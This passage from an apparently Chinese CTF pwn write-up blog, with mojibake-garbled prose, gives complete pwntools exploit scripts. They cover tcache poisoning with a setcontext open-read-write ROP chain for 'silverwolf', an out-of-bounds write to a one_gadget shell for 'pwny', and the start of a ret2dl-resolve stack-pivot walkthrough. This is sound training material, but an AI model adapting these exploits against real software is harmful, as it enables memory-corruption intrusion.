\"\\x00\"*0x39+\np64(0x0)+ #0x20\np64(0x0)+ #0x30\np64(0x0)+ #0x40\np64(0x0)+ #0x50\np64(0x0)+ #0x60\np64(IO_2_1_stdout_addr)+ #0x70\np64(heap+0x10)) #0x80\nadd(0,0x68)\n#delete(0)\n#edit(0,p64(malloc_hook))\n#add(0,0x8)\n#add(0,0x8)\nedit(0,p64(0xFBAD1800)+p64(IO_2_1_stdout_addr+131)*0x3+p64(environ)+p64(environ+0x8))\nstack = u64(p.recv(6)+\"\\x00\"+\"\\x00\")\nprint(\"stack\",hex(stack))\nedit(0,p64(0xFBAD1800) +p64(IO_2_1_stdout_addr+131)*0x3+p64(stack+168)+p64(stack+168+8))\nelf = u64(p.recv(6)+\"\\x00\"+\"\\x00\")-0x40\nprint(\"elf\",hex(elf))\nbss = elf+0x202020\nsize_addr = bss+0x30\n\n#set free_hook to setcontext+53\nadd(0,0x78)\nedit(0,\"\\x01\"+\"\\x01\"+\"\\x00\"+\"\\x00\"+\"\\x01\"+\"\\x02\"+\"\\x04\"+ \"\\x00\"*0x39+\np64(free_hook)+ #0x20\np64(0x0)+ #0x30\np64(0x0)+ #0x40\np64(0x0)+ #0x50\np64(size_addr)+ #0x60\np64(0x0)+ #0x70\np64(heap+0x10)) #0x80\nadd(0,0x8)\nedit(0,p64(setcontext+53))\n\nadd(0,0x78)\nedit(0,\"\\x02\"+\"\\x01\"+\"\\x01\"+\"\\x01\"+\"\\x01\"+\"\\x02\"+\"\\x04\"+\"\\x02\" +\"\\x00\"*0x38+\np64(heap+0x2e0)+ #0x20\np64(heap+0x2e0+0x10)+ #0x30 \np64(heap+0x2e0+0x30)+ #0x40 \np64(heap+0x2e0+0x60)+ #0x50\np64(heap+0x2e0+0xa0)+ #0x60\np64(heap+0x2e0+0xf0)+ #0x70 \np64(heap+0x2e0)) #0x80\n\n\nfake_rsp = heap+0x2e0+0xb0+0x10\nflag = heap+0x2e0+0xb0\n\norw = \"a\"*0xa0 + p64(fake_rsp)+p64(ret)\norw += './flag\\x00\\x00'\norw += p64(0)\norw += p64(pop_rdi_ret) + p64(flag)\norw += p64(pop_rsi_ret) + p64(0)\norw += p64(pop_rax_ret) + p64(2)\norw += p64(syscall_ret)\norw += p64(pop_rdi_ret) + p64(3)\norw += p64(pop_rsi_ret) + p64(fake_rsp+0x200)\norw += p64(pop_rdx_ret) + p64(0x30)\norw += p64(libc_base+libc.sym['read'])\norw += p64(pop_rdi_ret) + p64(1)\norw += p64(libc_base+libc.sym['write'])\nprint(len(orw))\n\n#copy the orw to heap+0x2e0\nadd(0,0x10)\nedit(0,orw[0:0x10])\n\nadd(0,0x20)\nedit(0,orw[0x10:0x30])\n\nadd(0,0x30)\nedit(0,orw[0x30:0x60])\n\nadd(0,0x40)\nedit(0,orw[0x60:0xa0])\n\nadd(0,0x50)\nedit(0,orw[0xa0:0xf0])\n\nadd(0,0x60)\nedit(0,orw[0xf0:0x150])\n\nadd(0,0x78)\ndelete(0)\n\np.interactive()\n```\n\n \n\nâ‘¡ä¿®æ”¹sizeï¼š\n\n```\nfrom pwn import *\nimport os\nimport struct\nimport random\nimport time\nimport sys\nimport signal\n\n#context.log_level = 'debug'\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nlocal = 1\nif local:\np = process('./silverwolf')\nelf = ELF(\"./silverwolf\")\nlibc = ELF(\"/lib/x86_64-linux-gnu/libc-2.27.so\")\nelse:\np = remote(\"114.116.231.128\",\"25285\")\nlibc = ELF(\"./libc-2.27.so\")\n\n\n#ROPgadget\nret = libc_base + 0x00000000000008aa # ret\npop_rdi_ret = libc_base + 0x00000000000215bf# pop rdi ; ret\npop_rsi_ret = libc_base + 0x0000000000023eea # pop rsi ; ret \npop_rdx_rsi_ret = libc_base + 0x0000000000130569 # pop rdx ; pop rsi ; ret\npop_rdx_ret = libc_base + 0x0000000000001b96 # pop rdx ; ret\nsyscall_ret = libc_base + 0x11B637\npop_rax_ret = libc_base + 0x0000000000043ae8\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"Your choice: \"\n\n\ndef add(idx, size):\n    sla(menu, \"1\")\n    sla(\"Index: \",str(idx))\n    sla(\"Size: \",str(size))\n\n\ndef delete(idx):\n    sla(menu, \"4\")\n    sla(\"Index: \", str(idx))\n\ndef show(idx):\n    sla(menu, \"3\")\n    sla(\"Index: \", str(idx))\n\ndef edit(idx,con):\n    sla(menu, \"2\")\n    sla(\"Index: \", str(idx))\n    sla(\"Content: \", str(con))\n\n#leak heap\nadd(0,8)\nadd(0,8)\ndelete(0)\nedit(0,\"A\"*8)\nshow(0)\nru(\"AAAAAAAA\")\nheap = u64(p.recv(6)+\"\\x00\"+\"\\x00\")-0x10\nprint(\"heap:\",hex(heap))\n\n#control tcache struct,leak libc\nadd(0,0x78)\ndelete(0)\n#edit(0,p64(heap+0x2a0))\nedit(0,p64(heap+0x10))\nadd(0,0x78)\nadd(0,0x78)\nedit(0,\"\\x00\"*35+\"\\x07\")\ndelete(0)\nshow(0)\nru(\"Content: \")\nmalloc_hook = u64(p.recv(6)+\"\\x00\"+\"\\x00\")-112\nfree_hook = malloc_hook+7352\nlibc_base = malloc_hook-0x3EBC30\nsetcontext = libc_base+libc.sym['setcontext']\nsystem = libc_base+0x4F550\nIO_2_1_stdout_addr = libc_base + libc.symbols['_IO_2_1_stdout_']\nenviron = libc_base+libc.symbols['__environ']\nprint(\"IO_stdout:\",hex(IO_2_1_stdout_addr))\nprint(\"environ:\",hex(environ))\nprint(\"libc:\",hex(libc_base))\nprint(\"setcontext:\",hex(setcontext))\nprint(\"system:\",hex(system))\nprint(\"free_hook:\",hex(free_hook))\nprint(\"malloc_hook:\",hex(malloc_hook))\nprint(\"libsystem:\",hex(libc.sym[\"system\"]))\n\n#use IO_FILE,leak environ,elf_base,bss_addr,change size\nedit(0,\"\\x00\"+\"\\x00\"+\"\\x00\"+\"\\x00\"+\"\\x00\"+\"\\x02\"+\"\\x04\"+ \"\\x00\"*0x39+\np64(0x0)+ #0x20\np64(0x0)+ #0x30\np64(0x0)+ #0x40\np64(0x0)+ #0x50\np64(0x0)+ #0x60\np64(heap+0x10)+ #0x70\np64(IO_2_1_stdout_addr)) #0x80\nadd(0,0x78)\n#delete(0)\n#edit(0,p64(malloc_hook))\n#add(0,0x8)\n#add(0,0x8)\nedit(0,p64(0xFBAD1800)+p64(IO_2_1_stdout_addr+131)*0x3+p64(environ)+p64(environ+0x8))\nstack = u64(p.recv(6)+\"\\x00\"+\"\\x00\")\nprint(\"stack\",hex(stack))\nedit(0,p64(0xFBAD1800) +p64(IO_2_1_stdout_addr+131)*0x3+p64(stack+168)+p64(stack+168+8))\nelf = u64(p.recv(6)+\"\\x00\"+\"\\x00\")-0x40\nprint(\"elf\",hex(elf))\nbss = elf+0x202020\nsize_addr = bss+0x30\n\n#set free_hook to setcontext+53\nadd(0,0x68)\nedit(0,\"\\x01\"+\"\\x01\"+\"\\x00\"+\"\\x00\"+\"\\x01\"+\"\\x02\"+\"\\x04\"+ \"\\x00\"*0x39+\np64(free_hook)+ #0x20\np64(heap+0x260)+ #0x30\np64(0x0)+ #0x40\np64(0x0)+ #0x50\np64(size_addr)) #0x60\nadd(0,0x8)\nedit(0,p64(setcontext+53))\n\n#get final chunk\nadd(0,0x58)\nedit(0,p64(0x500)+p64(heap+0x2e0))\n\n\nfake_rsp = heap+0x2e0+0xb0+0x10\nflag = heap+0x2e0+0xb0\norw = \"a\"*0xa0 + p64(fake_rsp)+p64(ret)\norw += './flag\\x00\\x00'\norw += p64(0)\norw += p64(pop_rdi_ret) + p64(flag)\norw += p64(pop_rsi_ret) + p64(0)\norw += p64(pop_rax_ret) + p64(2)\norw += p64(syscall_ret)\norw += p64(pop_rdi_ret) + p64(3)\norw += p64(pop_rsi_ret) + p64(fake_rsp+0x200)\norw += p64(pop_rdx_ret) + p64(0x30)\norw += p64(libc_base+libc.sym['read'])\norw += p64(pop_rdi_ret) + p64(1)\norw += p64(libc_base+libc.sym['write'])\n\nedit(0,orw)\ndelete(0)\n\np.interactive()\n```\n\nâ–²å†™å¾—æœ‰ç‚¹ä¹±ï¼Œä¸ºäº†è¾¾åˆ°æ•ˆæœä¸­é—´åŠ äº†ä¸å°‘ä¸å¿…è¦çš„ï¼Œæ…¢æ…¢æ¥å§ï¼Œåé¢ä¼°è®¡å°±èƒ½æ›´å¥½æ§tcacheäº†ã€‚\n\nä¸‰ã€pwnmyï¼šè¶Šç•Œä»»æ„å†™\n\nè¿™é“é¢˜å¾ˆæœ‰æ„æ€ï¼Œç”¨åˆ°äº†å¾ˆå¤šçŸ¥è¯†ç‚¹ã€‚\n\n1.å…³äºreadå‡½æ•°ï¼šread(fd,&var,amount)\n\nreadå‡½æ•°ä¸­çš„fdå¦‚æœä¸ä¸º0ï¼Œé‚£ä¹ˆå¦‚æœfdå¯¹åº”çš„Filehandleä¸­æ²¡æœ‰æ•°æ®ï¼Œç›¸å½“äºæ²¡æœ‰è¢«æ‰§è¡Œï¼Œå¦‚æœæœ‰æ•°æ®ï¼Œé‚£ä¹ˆå°±ç›¸å½“äºæ˜¯å¤åˆ¶ï¼Œå°†fdå¯¹åº”Filehandleä¸­çš„æ•°æ®å¤åˆ¶amountä¸ªå­—èŠ‚ç»™varã€‚å…¶å®æœ¬è´¨æ¥è¯´readå°±æ˜¯ä¸€ä¸ªå¤åˆ¶å‡½æ•°ï¼Œåªæ˜¯fdä¸º0ä»£è¡¨æ ‡å‡†è¾“å…¥ï¼Œæ‰€ä»¥ä¼šä»æˆ‘ä»¬çš„è¾“å…¥ä¸­è·å–æ•°æ®æ¥å¤åˆ¶ã€‚æ‰€ä»¥å¾ˆå¤šæ—¶å€™èƒ½å¤Ÿç”¨åˆ°fdæ¥å‡ºé¢˜ã€‚\n\nè¿™é‡Œå°±ç”¨åˆ°é¢˜ç›®çš„writeå‡½æ•°ï¼Œç¬¬ä¸€æ¬¡write(256)è¶Šç•Œï¼Œå°†fdå¯¹åº”çš„Filehandleä¸­çš„éšæœºå€¼å¤åˆ¶ç»™byte_202860ï¼Œæ­¤æ—¶byte_202860ä¸­çš„å€¼ä¸ºresult = open(\"/dev/urandom\", 0);å‡ºæ¥çš„éšæœºå€¼ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191448117.png)\n\nä¹‹åå†æ¬¡write(256)è¶Šç•Œï¼Œæ­¤æ—¶byte_202860ä»éšæœºå€¼ä¸­å–ä¸€ä¸ªå­—èŠ‚ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191448471.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191448783.png)\n\nè¿™é‡Œå¤ç°æ—¶ä¸º0x15ï¼Œä½†æ˜¯0x15æ²¡æœ‰å¯¹åº”çš„Filehandleï¼Œé‚£ä¹ˆä¾æ®readå‡½æ•°çš„æ€§è´¨ï¼Œç›¸å½“äºæ²¡æœ‰è¿è¡Œï¼Œæ‰€ä»¥byte_202860å°±ä¼šè¢«èµ‹å€¼ä¸º0ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆè¦write(256)ä¸¤æ¬¡çš„åŸå› ã€‚\n\n2.å…³äºgetshellæ–¹æ³•ï¼š\n\n(1)åˆ©ç”¨scanfå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°åœ¨æ¥æ”¶è¿‡å¤šè¾“å…¥æ—¶ï¼Œä¼šç”³è¯·å †å—ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥ç”¨mallocå’Œreallocè°ƒæ•´æ ˆå¸§é…åˆone_gadgetæ¥getshellã€‚å› ä¸ºæˆ‘è°ƒè¯•çš„æ—¶å€™æ‰€æœ‰çš„one_gadgetéƒ½ä¸æ»¡è¶³ã€‚\n\n(2)åˆ©ç”¨exitå‡½æ•°ï¼Œå‡½æ•°æµä¸ºï¼š\n\nexit()->__run_exit_handlers->_dl_fini->*******[_dl_rtld_lock_recursive/_dl_rtld_unlock_recursive]\n\nè€Œ[_dl_rtld_lock_recursive/_dl_rtld_unlock_recursive]ä½äºç»“æ„ä½“_rtld_globalä¸­ï¼Œå¯è¯»å¯å†™ï¼Œæ‰€ä»¥åˆ©ç”¨ä»»æ„å†™æ”¹æ‰_rtld_globalä¸­çš„å‡½æ•°æŒ‡é’ˆä¸ºone_gadgetå³å¯ã€‚ä½†æ˜¯è¿™é‡Œçš„One_gadgetä¹Ÿéƒ½ä¸ç¬¦åˆï¼Œæ‰€ä»¥éœ€è¦ç”¨åˆ°ä¸€äº›gadgetæ¥è°ƒæ•´ï¼Œè¿™é‡Œè‡ªå·±æ‰¾å§ã€‚\n\næ¨èï¼šhttps://www.cnblogs.com/bhxdn/p/14222558.html\n\n(3)åˆ©ç”¨environï¼Œå¯ä»¥åˆ©ç”¨libcä¸Šçš„environæ¥è·å–æ ˆåœ°å€ï¼Œç„¶åç›´æ¥æ”¹æ ˆä¸Šçš„è¿”å›åœ°å€å—ï¼Œå¯¹åº”è°ƒæ•´æ ˆå¸§å³å¯ã€‚è¿™é‡Œæ”¹writeçš„è¿”å›åœ°å€å¯ä»¥ç›´æ¥getshellã€‚\n\n4.å…³äºæ³„éœ²åœ°å€ï¼š\n\n(1)libcåœ°å€ï¼šå¯ä»¥çœ‹åˆ°bssæ®µä¸Šä¿å­˜ç€ä¸‰ä¸ªæ ‡å‡†ç¬¦å·ï¼š012->stdout,stdin,stderrã€‚è€Œè¿™ä¸‰ä¸ªbssæ®µå˜é‡åœ¨æ‰€æœ‰libcä¸­éƒ½æœ‰ï¼Œå¹¶ä¸”é‡Œé¢ä¿å­˜ç€å¯¹åº”çš„ç»“æ„ä½“çš„åœ°å€ï¼š\n\n_IO_2_1_stdout,_IO_2_1_stdin,_IO_2_1_stderr\n\næ‰€ä»¥å¯ä»¥åˆ©ç”¨ä»»æ„è¯»æ¥è·å–libcåœ°å€ã€‚\n\n(2)elfåœ°å€ï¼šç”±äºä¹‹åéœ€è¦ä¿®æ”¹libcåœ°å€å—ï¼Œæ‰€ä»¥ä¸€å®šéœ€è¦qword_202060çš„åœ°å€ï¼Œè€Œè¿™ä¸ªelfåœ°å€å°±åªèƒ½å¾€åæ‰¾äº†ï¼Œç”¨qword_202060[v2]çš„ç›¸å¯¹åç§»å¾€åæ‰¾äº†ï¼Œè¿™é‡Œè‡ªå·±æ‰¾ã€‚\n\nâ–²ç»¼ä¸Šæ‰€è¿°ï¼Œè¿™é“é¢˜ä¹Ÿå·®ä¸å¤šäº†ï¼Œè€ƒç‚¹è¿˜æ˜¯æŒºå¤šçš„ï¼Œæ–¹æ³•ä¹ŸæŒºå¤šã€‚\n\n```\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./pwny\"\nlibc_file = \"./libc-2.27.so\"\n#libc_file = \"\"\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)  \n\n#libcsearcher use\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\")        #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\n\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    libc = ELF(libc_file)\nelse:\n    p = remote(\"119.3.81.43\",\"49153\")\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\n\n\ndef menu(idx):\n    sla(\": \", str(idx))\n\ndef write_fd(idx):\n    menu(2)\n    sla(\": \", str(idx))\n\n\ndef write(idx, con):\n    menu(2)\n    sla(\": \", str(idx))\n    sd(con)\n\ndef read(idx):\n    menu(1)\n    sa(\": \", idx)\n\nwrite_fd(256)\ngdb.attach(p)\npause()\n\nwrite_fd(256)\n\n#leak stderr\nread(p64(-4&0xffffffffffffffff))\nru(\": \")\nstderr_addr = int(ru(\"\\n\"), 16)\n\n#leak elf\nread(p64(-0xb&0xffffffffffffffff))\nru(\": \")\nelf_base = int(ru(\"\\n\"), 16) -0x202008\n\nlog.info(\"stderr_addr:0x%x\"%stderr_addr)\nlog.info(\"elf_base:0x%x\"%elf_base)\n\nqword_202060_addr = elf_base+0x202060\n\nobj = LibcSearcher(\"_IO_2_1_stderr_\", stderr_addr)\nlibc_base = stderr_addr-obj.dump('_IO_2_1_stderr_')\nlog.info(\"libc_base:0x%x\"%libc_base)\nsystem_addr = libc_base + obj.dump(\"system\")        #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\n\nmalloc_hook_addr = libc_base + obj.dump(\"__malloc_hook\")\nrealloc_hook_addr = libc_base + obj.dump(\"__realloc_hook\")\nrealloc_addr = libc_base + obj.dump(\"realloc\")\n_rtld_global_addr = libc_base + obj.dump(\"_rtld_global_\")\n# offset1 = (_rtld_global_addr+3840 - qword_202060_addr)/8\n# offset2 = (_rtld_global_addr+3848 - qword_202060_addr)/8\noffset_malloc = (malloc_hook_addr-qword_202060_addr)/8\noffset_realloc_hook = (realloc_hook_addr-qword_202060_addr)/8\n# log.info(\"offset1:0x%x\"%offset1)\n# log.info(\"offset1:0x%x\"%offset2)\n\nlog.info(\"_rtld_global_addr:0x%x\"%_rtld_global_addr)\nlog.info(\"realloc_addr:0x%x\"%realloc_addr)\nlog.info(\"malloc_hook_addr:0x%x\"%malloc_hook_addr)\nlog.info(\"realloc_hook_addr:0x%x\"%realloc_hook_addr)\n\none_gadget = libc_base + 0x10a41c\nlog.info(\"one_gadget:0x%x\"%one_gadget)\n\n# write(offset1,p64(one_gadget))\n# write(offset2,p64(one_gadget))\nwrite(offset_malloc,p64(realloc_addr+0x4))\nwrite(offset_realloc_hook,p64(one_gadget))\n\n# gdb.attach(p)\n# pause()\n\nsl(\"9\"*0x1000)\np.interactive()\n```\n\n \n\n \n","tags":["æ¯”èµ›"],"categories":["PWN"]},{"title":"XMAN 2016-level3(32+64)","url":"/2021/08/14/XMAN 2016-level3(32+64)/","content":"\nä¸€ã€32ä½ç¨‹åº\n\n1.å¸¸è§„checksecï¼Œå¼€äº†Partial RELROå’ŒNXï¼ŒIDAæ‰¾æ¼æ´ï¼Œå¾ˆæ˜æ˜¾åœ¨vulnerable_functionå‡½æ•°ä¸­å­˜åœ¨æ ˆæº¢å‡ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nchar buf; // [esp+0h] [ebp-88h]\n----------------------------------------------------------------------\nreturn read(0, &buf, 0x100u);\n```\n\n2.å¾ˆå¤šç§æ–¹æ³•ï¼Œè¿™é‡Œé€‰æ‹©ç”¨ret2dl-resolveæ¥å°è¯•è§£å†³ã€‚\n\n3.å…³äºret2dl-resolveä»‹ç»ï¼Œç¯‡å¹…å¤ªé•¿ï¼Œä¸è¯´äº†ï¼Œåé¢æ”¾èµ„æ–™é“¾æ¥ï¼Œä»‹ç»ä¸€ä¸‹è£…è½½æµç¨‹ï¼š\n\n(1)é€šè¿‡struct link_map *lè·å¾—.dynsymã€.dynstrã€.rel.pltåœ°å€\n(2)é€šè¿‡reloc_arg+.rel.pltåœ°å€å–å¾—å‡½æ•°å¯¹åº”çš„Elf32_RelæŒ‡é’ˆï¼Œè®°ä½œreloc\n(3)é€šè¿‡reloc->r_infoå’Œ.dynsymåœ°å€å–å¾—å‡½æ•°å¯¹åº”çš„Elf32_SymæŒ‡é’ˆï¼Œè®°ä½œsym\n(4)æ£€æŸ¥r_infoæœ€ä½ä½æ˜¯å¦ä¸º7\n(5)æ£€æŸ¥(sym->st_other)&0x03æ˜¯å¦ä¸º0\n(6)é€šè¿‡strtab+(sym->st_name)è·å¾—å‡½æ•°å¯¹åº”çš„å­—ç¬¦ä¸²ï¼Œè¿›è¡ŒæŸ¥æ‰¾ï¼Œæ‰¾åˆ°åèµ‹å€¼ç»™rel_addr,æœ€åè°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚\n\n4.é¦–å…ˆæ€è€ƒexpç¼–å†™çš„æ”»å‡»æ€è·¯ï¼Œç”±äºæ ˆæº¢å‡ºçš„æ¯”è¾ƒå°‘ï¼Œè€Œret2dl-resolveæ”»å‡»éœ€è¦æ„é€ å‡ ä¸ªç»“æ„ä½“ï¼Œæ‰€å ç©ºé—´è¾ƒå¤§ï¼Œæ‰€ä»¥è¿™é‡Œè¿›è¡Œæ ˆåŠ«æŒï¼Œå°†æ ˆåŠ«æŒåˆ°ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ç”Ÿæˆçš„bssæ®µä¸Šã€‚ä¹‹åå†åœ¨æ ˆä¸Šå¸ƒç½®ç»“æ„ä½“å’Œå¿…è¦æ•°æ®ï¼Œé‡æ–°æ‰§è¡Œå»¶è¿Ÿç»‘å®šï¼ŒåŠ«æŒåŠ¨æ€è£…è½½ï¼Œå°†writeå‡½æ•°è£…è½½æˆsystemå‡½æ•°ï¼Œå¹¶ä¸”åœ¨åŠ«æŒçš„åŒæ—¶å°†Binshå­—ç¬¦ä¸²æ”¾åœ¨æ ˆä¸Šï¼Œè¿™æ ·åŠ«æŒå®Œæˆåå°±ç›´æ¥è°ƒç”¨systemå‡½æ•°ï¼Œå‚æ•°å°±æ˜¯binshã€‚\n\n(1)é¦–å…ˆéœ€è¦æ‰¾åˆ°ç›¸å…³çš„æ•°æ®åœ°å€ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nwrite_got = 0x0804a018\nread_plt = 0x08048310\nplt0_addr = 0x08048300\nleave_ret = 0x08048482\npop3_ret = 0x08048519\npop_ebp_ret = 0x0804851b\nnew_stack_addr = 0x0804a500 \n#ç¨‹åºè¿è¡Œèµ·æ¥æ‰ä¼šæœ‰ï¼Œbssä¸gotè¡¨ç›¸é‚»ï¼Œ_dl_fixupä¸­ä¼šé™ä½æ ˆåä¼ å‚ï¼Œè®¾ç½®ç¦»bssé¦–åœ°å€è¿œä¸€ç‚¹é˜²æ­¢å‚æ•°å†™å…¥éæ³•åœ°å€å‡ºé”™\n\nrelplt_addr = 0x080482b0 \n#.rel.pltçš„é¦–åœ°å€ï¼Œé€šè¿‡è®¡ç®—é¦–åœ°å€å’Œæ–°æ ˆä¸Šæˆ‘ä»¬ä¼ªé€ çš„ç»“æ„ä½“Elf32_Relåç§»æ„é€ reloc_arg\n\ndynsym_addr = 0x080481cc \n#.dynsymçš„é¦–åœ°å€ï¼Œé€šè¿‡è®¡ç®—é¦–åœ°å€å’Œæ–°æ ˆä¸Šæˆ‘ä»¬ä¼ªé€ çš„Elf32_Symç»“æ„ä½“åç§»æ¥æ„é€ Elf32_Rel.r_info\n\ndynstr_addr = 0x0804822c \n#.dynstrçš„é¦–åœ°å€ï¼Œé€šè¿‡è®¡ç®—é¦–åœ°å€å’Œæ–°æ ˆä¸Šæˆ‘ä»¬ä¼ªé€ çš„å‡½æ•°åå­—ç¬¦ä¸²systemåç§»æ¥æ„é€ Elf32_Sym.st_name\n```\n\nè¿™é‡Œå¯»æ‰¾çš„relplt_addrï¼Œdynsym_addrï¼Œdynstr_addrä¸€èˆ¬éƒ½æ˜¯ä½äºELFæ–‡ä»¶å¤´éƒ¨çš„LOADæ®µã€‚ç”¨readelf -S binaryä¹Ÿå¯ä»¥çœ‹åˆ°ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191516027.jpeg)\n\nâ‘ relplt_addrï¼š0x080482b0\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191516591.jpeg)\n\nâ‘¡dynsym_addrï¼š0x080481cc\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191516336.jpeg)\n\nâ‘¢dynstr_addrï¼š0x0804822c\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191516123.jpeg)\n\n(2)å†è¿›è¡Œæ ˆåŠ«æŒï¼š\n\n```\n#æ³¨é‡Šå¤´\n\npayload = \"\"\npayload += 'A'*140 #padding\npayload += p32(read_plt) \n#è°ƒç”¨readå‡½æ•°å¾€æ–°æ ˆå†™å€¼ï¼Œé˜²æ­¢leave; retnåˆ°æ–°æ ˆåå‡ºç°retåˆ°åœ°å€0ä¸Šå¯¼è‡´å‡ºé”™\npayload += p32(pop3_ret) \n#readå‡½æ•°è¿”å›åœ°å€ï¼Œä»æ ˆä¸Šå¼¹å‡ºä¸‰ä¸ªå‚æ•°ä»è€Œèƒ½å¤Ÿå°†espæ‹‰åˆ°pop_ebp_retçš„åœ°æ–¹æ¥æ‰§è¡Œ\npayload += p32(0) #fd = 0\npayload += p32(new_stack_addr) #buf = new_stack_addr\npayload += p32(0x400) #size = 0x400\npayload += p32(pop_ebp_ret)\n#æŠŠæ–°æ ˆé¡¶ç»™ebp\npayload += p32(new_stack_addr)\npayload += p32(leave_ret)\n#æ¨¡æ‹Ÿå‡½æ•°è¿”å›ï¼Œåˆ©ç”¨leaveæŒ‡ä»¤æŠŠebpçš„å€¼èµ‹ç»™espï¼Œå®Œæˆæ ˆåŠ«æŒï¼ŒåŒæ—¶ebpæŒ‡å‘ç¬¬äºŒæ®µpayloadçš„ç¬¬ä¸€ä¸ªå†…å®¹ï¼Œeipä¸ºç¬¬äºŒæ®µpayloadä¸­çš„plt0_addr\n\nio.send(payload) #æ­¤æ—¶ç¨‹åºä¼šåœåœ¨ä½¿ç”¨payloadè°ƒç”¨çš„readå‡½æ•°å¤„ç­‰å¾…è¾“å…¥æ•°æ®\n```\n\n(3)ä¼ªé€ ä¸¤ä¸ªç»“æ„ä½“å’Œå¿…è¦çš„æ•°æ®ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n\nfake_Elf32_Rel_addr = new_stack_addr + 0x50\n#åœ¨æ–°æ ˆä¸Šé€‰æ‹©ä¸€å—ç©ºé—´æ”¾ä¼ªé€ çš„Elf32_Relç»“æ„ä½“ï¼Œç»“æ„ä½“å¤§å°ä¸º8å­—èŠ‚\n\nfake_Elf32_Sym_addr = new_stack_addr + 0x5c \n#åœ¨ä¼ªé€ çš„Elf32_Relç»“æ„ä½“åé¢æ¥ä¸Šä¼ªé€ çš„Elf32_Symç»“æ„ä½“ï¼Œç»“æ„ä½“å¤§å°ä¸º0x10å­—èŠ‚\n\nfake_reloc_arg = fake_Elf32_Rel_addr - relplt_addr \n#è®¡ç®—ä¼ªé€ çš„reloc_arg\n\nfake_st_name_addr = new_stack_addr + 0x6c - dynstr_addr \n#ä¼ªé€ çš„Elf32_Symç»“æ„ä½“åé¢æ¥ä¸Šä¼ªé€ çš„å‡½æ•°åå­—ç¬¦ä¸²system_addr \n\nfake_r_info = ((fake_Elf32_Sym_addr - dynsym_addr)/0x10) << 8 | 0x7 \n#ä¼ªé€ r_infoï¼Œåç§»è¦è®¡ç®—æˆä¸‹æ ‡ï¼Œé™¤ä»¥Elf32_Symçš„å¤§å°ï¼Œæœ€åä¸€å­—èŠ‚ä¸º0x7\n\n\nfake_Elf32_Rel_data = \"\"\nfake_Elf32_Rel_data += p32(write_got) \n#r_offset = write_gotï¼Œä»¥å…é‡å®šä½å®Œæ¯•å›å¡«gotè¡¨çš„æ—¶å€™å‡ºç°éæ³•å†…å­˜è®¿é—®é”™è¯¯\nfake_Elf32_Rel_data += p32(fake_r_info)\n\nfake_Elf32_Sym_data = \"\"\nfake_Elf32_Sym_data += p32(fake_st_name_addr)\nfake_Elf32_Sym_data += p32(0) \n#åé¢çš„æ•°æ®ç›´æ¥å¥—ç”¨writeå‡½æ•°çš„Elf32_Symç»“æ„ä½“\nfake_Elf32_Sym_data += p32(0)\nfake_Elf32_Sym_data += p8(0x12)\nfake_Elf32_Sym_data += p8(0)\nfake_Elf32_Sym_data += p16(0)\n\nbinsh_addr = new_stack_addr + 0x74 #æŠŠ/bin/sh\\x00å­—ç¬¦ä¸²æ”¾åœ¨æœ€åé¢\n```\n\nâ‘ reloc_argä½œç”¨ï¼šä½œä¸ºåç§»å€¼ï¼Œä¸relplt_addrç›¸åŠ å¾—åˆ°ELF32_Relç»“æ„ä½“çš„åœ°å€ã€‚è¿™é‡Œè®¾ç½®æˆfake_reloc_arg = fake_Elf32_Rel_addr - 